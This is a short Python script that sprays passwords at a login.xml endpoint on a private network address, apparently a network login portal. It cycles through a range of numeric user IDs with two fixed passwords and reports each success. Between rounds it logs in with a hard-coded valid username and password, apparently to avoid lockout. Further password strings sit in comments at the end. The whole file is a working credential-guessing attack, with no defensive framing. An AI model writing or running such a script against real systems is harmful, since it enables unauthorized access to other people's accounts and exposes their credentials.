import requests, time

url = "http://172.16.68.6:8090/login.xml"

def login(user, passwd):
    req = {'mode': '191', 'username': user, 'password': passwd}
    x = requests.post(url, data=req)
    if x.text[90] == 'Y':
        return f'[+] SUCCESS User = {user}, Pass = {passwd}'
    else:
        return f'[-] {user} Failure :('

def logout(user):
    req = {'mode': '193', 'username': user}
    x = requests.post(url, data=req)

def correct_attempt():
    login("19102168", "178045HI")

for en in range(19102100, 19102200, 2):
    print(login(en, "178045HI"))
    time.sleep(0.05)
    logout(en)
    print(login(en, "179001AS"))
    time.sleep(0.05)
    logout(en)
    print(login(en+1, "178045HI"))
    time.sleep(0.05)
    logout(en)
    print(login(en+1, "179001AS"))
    time.sleep(0.05)
    logout(en)
    correct_attempt()

# 179001AS
# 357043AR